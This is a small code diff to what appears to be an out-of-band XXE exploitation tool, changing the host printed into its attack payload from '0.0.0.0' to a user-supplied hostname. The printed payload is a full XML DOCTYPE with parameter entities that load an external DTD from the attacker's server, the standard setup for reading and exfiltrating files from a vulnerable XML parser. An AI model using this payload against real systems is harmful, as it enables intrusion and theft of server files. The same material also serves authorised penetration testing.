@@ -180,7 +180,7 @@ def main():
 
     print_info("Servers started. Use the following payload (with URL-encoding):\n\n" \
         "<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE xmlrootname [<!ENTITY %% aaa SYSTEM \"http://%s:%d/ext.dtd\">%%aaa;%%ccc;%%ddd;]>" \
-        "\n\n" % ("0.0.0.0", argv.http))
+        "\n\n" % (argv.hostname, argv.http))
 
     while True:
         time.sleep(1000)
